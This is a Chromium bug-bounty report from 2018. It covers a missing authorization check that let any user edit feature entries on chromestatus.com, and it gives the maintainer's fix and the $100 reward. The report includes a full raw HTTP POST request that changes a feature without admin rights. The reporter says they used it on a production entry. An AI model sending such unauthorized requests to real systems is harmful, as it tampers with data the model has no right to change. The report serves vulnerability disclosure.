# Security: Unauthorized users can edit features on https://www.chromestatus.com

| Field | Value |
|-------|-------|
| **Issue ID** | [40090940](https://issues.chromium.org/issues/40090940) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Infra |
| **Reporter** | tt...@gmail.com |
| **Assignee** | er...@chromium.org |
| **Created** | 2018-03-28 |
| **Bounty** | $100.00 |

## Description

**VULNERABILITY DETAILS**  

Unauthorized users can edit/change features on <https://www.chromestatus.com>.  

They can maybe even delete features, but I have not tested it because I don't want to destroy any features in a production system.

**REPRODUCTION CASE**  

POC: <https://www.youtube.com/watch?v=bQOxstD-V4c>. <https://www.chromestatus.com/feature/6269417340010496>. Look at the comments.  

I hope I haven't removed/changed anything important.

Request:  

POST /admin/features/6269417340010496 HTTP/1.1  

Host: lighthouse-ci-staging-dot-cr-status.appspot.com  

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0  

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8  

Accept-Language: fr-FR  

Accept-Encoding: gzip, deflate  

origin: <https://lighthouse-ci-staging-dot-cr-status.appspot.com>  

DNT: 1  

Connection: close  

Content-Length: 716  

Content-Type: application/x-www-form-urlencoded

name=%20Treat%20`http://localhost`%20as%20a%20secure%20context.%20&category=3&summary=%20%20Developers%20generally%20expect%20`http://localhost`%20to%20have%20the%20same%20transport%20security%20characteristics%20as%20TLS,%20as%20it%20should%20resolve%20to%20a%20loopback%20address,%20and%20will%20therefore%20never%20hit%20the%20network.%20Chrome%20will%20ensure%20that%20this%20expectation%20is%20accurate%20by%20implementing%20[https://tools.ietf.org/html/draft-west-let-localhost-be-localhost,%20and%20carves%20out%20`http://localhost`%20accordingly.%20&impl\_status\_chrome=1&footprint=1&visibility=1&ff\_views=1&ie\_views=1&safari\_views=1&prefixed=1&standardization=1&comments=hi](https://tools.ietf.org/html/draft-west-let-localhost-be-localhost,%20and%20carves%20out%20%60http://localhost%60%20accordingly.%20&impl_status_chrome=1&footprint=1&visibility=1&ff_views=1&ie_views=1&safari_views=1&prefixed=1&standardization=1&comments=hi) from tthe.dollarr&web\_dev\_views=1

As you can see you can easily modify the params and update the feature.  

I've found that vulnerability via whitebox testing <https://github.com/GoogleChrome/chromium-dashboard/blob/master/admin.py#L317> .

I'mm not able to revert my changes and maybe this can help you to recover that page, because my GUI is not good enough: <https://pastebin.com/sY8YZ0eR>. See attachments too.

Kind Regards

## Attachments

- [original feature.png](attachments/original feature.png) (image/png, 105.6 KB)

## Timeline

### tt...@gmail.com (2018-03-28)

I guess some other routes / methods in "admin.py" are not protected too.
Maybe just add "login: admin" to https://github.com/GoogleChrome/chromium-dashboard/blob/master/app.yaml#L70.

### el...@chromium.org (2018-03-28)

Eric-- PTAL?

### sh...@chromium.org (2018-03-28)

[Empty comment from Monorail migration]

### mm...@chromium.org (2018-03-28)

I'm not sure which labels to apply, but putting this into reward-topanel queue speculatively.

### er...@chromium.org (2018-03-28)

Thanks for reporting this! `login: required` was removed in https://github.com/GoogleChrome/chromium-dashboard/pull/146 but we forgot to keep an auth check on the post() handler.


Fixed in https://github.com/GoogleChrome/chromium-dashboard/commit/f11e06622e9c913991776c09bc0ab809eaa78619


### sh...@chromium.org (2018-03-29)

[Empty comment from Monorail migration]

### tt...@gmail.com (2018-03-29)

Thank you for your quick actions! 
I can confirm, it should be fixed now!
And btw thank you for fixing my mistakes (https://www.chromestatus.com/feature/6269417340010496). 

Kind Regards

### aw...@google.com (2018-04-20)

[Empty comment from Monorail migration]

### aw...@google.com (2018-04-27)

...and $100 for this report.

### aw...@chromium.org (2018-04-27)

[Empty comment from Monorail migration]

### ts...@chromium.org (2018-05-02)

Guessing sev_medium based on payout and to fully close out the issue.  awhalley - please adjust as desired.

### ts...@chromium.org (2018-05-03)

Setting component for posterity

[Monorail components: Infra]

### sh...@chromium.org (2018-07-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-07-05)

This issue was migrated from crbug.com/chromium/826658?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090940)*
